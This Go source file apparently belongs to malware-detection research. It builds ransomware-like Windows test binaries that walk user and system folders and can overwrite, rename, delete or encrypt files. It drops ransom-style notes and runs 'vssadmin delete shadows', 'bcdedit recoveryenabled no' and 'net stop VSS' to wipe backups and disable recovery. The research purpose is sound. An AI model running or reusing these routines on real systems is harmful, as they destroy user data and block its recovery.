// hardneg_matrix.go - The same shapes, built with a different toolchain.
//
// Why a second and third language
// -------------------------------
// Every constructed hard negative so far is a small C binary from the same
// mingw cross-compiler. That makes them uniform in ways the experiment did
// not intend: around sixty imports each, the same runtime stubs, the same
// section layout. A static model that separates them from ransomware may be
// reading any of that rather than reading capability.
//
// The families in the positive set are not uniform either. Akira moved from
// C++ to Rust, Hive was ported to Rust, BlackCat is Rust, BlackByte moved
// from C# to Go. Between them Hive, Akira and BlackCat account for 405 of
// the 1,849 encrypting runs -- 22% of the positive class is Rust.
//
// Go and Rust link statically and carry their own runtime, so their import
// tables and section layouts have nothing in common with a mingw C binary.
// Compiling the identical behaviour three ways and comparing the outcome
// answers the question directly: if the three agree, the model is reading
// what the program did; if they do not, it is reading how it was built.
//
// Build:
//   GOOS=windows GOARCH=amd64 go build -ldflags "-X main.shape=4 ..." -o v.exe
//
// The parameters come in through -ldflags rather than as arguments, so that
// each variant is a distinct binary with its own hash, exactly as the C ones
// are. Passing them at runtime would give every variant the same sha256 and
// the same import table, and the feature table would carry one row repeated.
package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// Set at link time. Strings because -X only assigns strings.
var (
	shape   = "1"
	limit   = "200"
	order   = "0"
	timing  = "0"
	effects = "0"
	// Repeats of the same parameters must differ as files, or the linker
	// emits the identical binary and the pipeline keeps one of them.
	rep = "0"
)

const (
	newSuffix = ".matrix"
	windowMS  = 240000
	noteName  = "RESTORE_INSTRUCTIONS.txt"
	readChunk = 65536
)

var noteText = []byte("This folder was processed by a behaviour matrix test.\r\n" +
	"Nothing is encrypted and nothing is demanded.\r\n")

type root struct {
	path  string
	depth int
}

func roots() []root {
	return []root{
		{`C:\Program Files`, 3},
		{os.Getenv("LOCALAPPDATA"), 3},
		{filepath.Join(os.Getenv("USERPROFILE"), "Documents"), 3},
		{os.Getenv("APPDATA"), 3},
		{filepath.Join(os.Getenv("USERPROFILE"), "Desktop"), 3},
		{`C:\Program Files (x86)`, 3},
		{`C:\ProgramData`, 2},
	}
}

// The agent is a .pyw under Documents and the analyser stages itself under
// %LOCALAPPDATA%\Temp. Removing either ends the analysis, and the run is
// then recorded as a failure rather than as what it was.
func isProtected(path string) bool {
	low := strings.ToLower(path)
	if strings.HasSuffix(low, ".pyw") || strings.HasSuffix(low, ".py") {
		return true
	}
	return strings.Contains(low, `\temp\`) || strings.Contains(low, `\cape`)
}

func collect(max int) ([]string, []string) {
	var files []string
	dirSeen := map[string]bool{}
	var dirs []string

	for _, r := range roots() {
		if r.path == "" || len(files) >= max {
			continue
		}
		base := strings.Count(filepath.Clean(r.path), string(os.PathSeparator))
		filepath.Walk(r.path, func(p string, info os.FileInfo, err error) error {
			if err != nil {
				return nil // unreadable directories are skipped, not fatal
			}
			if len(files) >= max {
				return filepath.SkipDir
			}
			if info.IsDir() {
				if strings.Count(filepath.Clean(p), string(os.PathSeparator))-base > r.depth {
					return filepath.SkipDir
				}
				return nil
			}
			if strings.HasSuffix(p, newSuffix) || isProtected(p) {
				return nil
			}
			files = append(files, p)
			d := filepath.Dir(p)
			if !dirSeen[d] {
				dirSeen[d] = true
				dirs = append(dirs, d)
			}
			return nil
		})
	}
	return files, dirs
}

func readFile(path string) ([]byte, bool) {
	f, err := os.Open(path)
	if err != nil {
		return nil, false
	}
	defer f.Close()
	buf := make([]byte, readChunk)
	n, _ := f.Read(buf)
	if n <= 0 {
		return nil, false
	}
	return buf[:n], true
}

func writeFile(path string, data []byte) bool {
	return os.WriteFile(path, data, 0644) == nil
}

func pause(index, total, t int) {
	switch t {
	case 1:
		if total > 0 {
			time.Sleep(time.Duration(windowMS/total) * time.Millisecond)
		}
	case 2:
		if index > 0 && index%20 == 0 {
			time.Sleep(5 * time.Second)
		}
	case 3:
		time.Sleep(time.Duration(50+rand.Intn(2500)) * time.Millisecond)
	}
}

func runCommand(c string) {
	cmd := exec.Command("cmd.exe", "/c", c)
	cmd.Run()
}

func doEffects(mask int, dirs []string) {
	if mask&1 != 0 {
		n := 0
		for i, d := range dirs {
			if i >= 20 {
				break
			}
			if writeFile(filepath.Join(d, noteName), noteText) {
				n++
			}
		}
		fmt.Printf("effect note: %d directories\n", n)
	}
	if mask&4 != 0 {
		runCommand("vssadmin.exe delete shadows /all /quiet")
		fmt.Println("effect shadow")
	}
	if mask&8 != 0 {
		runCommand("bcdedit.exe /set {default} recoveryenabled no")
		fmt.Println("effect recovery")
	}
	if mask&16 != 0 {
		runCommand("net stop VSS /y")
		fmt.Println("effect service")
	}
}

func atoi(s string) int {
	v, _ := strconv.Atoi(s)
	return v
}

func main() {
	sh, lim, ord, tim, eff := atoi(shape), atoi(limit), atoi(order),
		atoi(timing), atoi(effects)
	fmt.Printf("matrix(go): shape=%d limit=%d order=%d timing=%d effects=%d rep=%s\n",
		sh, lim, ord, tim, eff, rep)
	time.Sleep(3 * time.Second)

	files, dirs := collect(4000)
	fmt.Printf("found %d files across %d directories\n", len(files), len(dirs))

	if ord == 1 {
		rand.Seed(time.Now().UnixNano())
		rand.Shuffle(len(files), func(i, j int) {
			files[i], files[j] = files[j], files[i]
		})
		fmt.Println("order: shuffled")
	} else {
		fmt.Println("order: as enumerated")
	}

	if lim > 0 && len(files) > lim {
		files = files[:lim]
	}
	fmt.Printf("processing %d files\n", len(files))

	var didRead, didWrite, didDelete, didMove int

	// Shape F folds everything into one output, so its handle lives outside
	// the loop.
	var bundle *os.File
	if sh == 6 {
		bundle, _ = os.Create(filepath.Join(os.Getenv("TEMP"), "matrix_bundle.bin"))
		if bundle != nil {
			defer bundle.Close()
		}
	}

	for i, path := range files {
		alt := path + newSuffix

		switch sh {
		case 1: // A: read only
			if _, ok := readFile(path); ok {
				didRead++
			}
		case 2: // B: read, write the same path
			if data, ok := readFile(path); ok {
				didRead++
				if writeFile(path, data) {
					didWrite++
				}
			}
		case 3: // C: read, write elsewhere, keep the original
			if data, ok := readFile(path); ok {
				didRead++
				if writeFile(alt, data) {
					didWrite++
				}
			}
		case 4: // D: read, write elsewhere, remove the original
			if data, ok := readFile(path); ok {
				didRead++
				if writeFile(alt, data) {
					didWrite++
					if os.Remove(path) == nil {
						didDelete++
					}
				}
			}
		case 5: // E: read, write the same path, remove it
			if data, ok := readFile(path); ok {
				didRead++
				if writeFile(path, data) {
					didWrite++
					if os.Remove(path) == nil {
						didDelete++
					}
				}
			}
		case 6: // F: many in, one out
			if data, ok := readFile(path); ok && bundle != nil {
				didRead++
				bundle.Write(data)
			}
		case 7: // K: read, remove, no replacement written
			if _, ok := readFile(path); ok {
				didRead++
				if os.Remove(path) == nil {
					didDelete++
				}
			}
		case 8: // H: scratch files of its own
			for k := 0; k < 3; k++ {
				s := fmt.Sprintf("%s.tmp%d", path, k)
				if writeFile(s, noteText) {
					didWrite++
					if os.Remove(s) == nil {
						didDelete++
					}
				}
			}
		case 9: // I: rename only
			if os.Rename(path, alt) == nil {
				didMove++
			}
		case 10: // J: as D, with the contents encrypted
			if data, ok := readFile(path); ok {
				didRead++
				enc := encrypt(data)
				if writeFile(alt, enc) {
					didWrite++
					if os.Remove(path) == nil {
						didDelete++
					}
				}
			}
		}
		pause(i, len(files), tim)
	}

	fmt.Printf("read=%d write=%d delete=%d move=%d\n",
		didRead, didWrite, didDelete, didMove)
	doEffects(eff, dirs)
	fmt.Println("done")
}
